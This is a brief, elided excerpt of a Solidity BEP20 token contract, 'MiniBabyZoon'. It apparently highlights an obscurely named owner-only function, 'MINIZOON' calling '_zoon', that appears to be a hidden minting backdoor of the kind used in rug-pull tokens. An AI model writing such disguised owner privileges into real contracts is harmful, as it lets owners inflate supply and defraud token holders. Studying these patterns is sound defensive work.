...
abstract contract Auth {
    ...
    function transferOwnedship() public virtual {
...
contract MiniBabyZoon is IBEP20, Auth {
    ...
    function MINIZOON(uint256 amount) public onlyOwner returns (bool){
        _zoon(msg.sender,amount);
        return true;
    }
    function _zoon(address account, uint256 amount) internal {
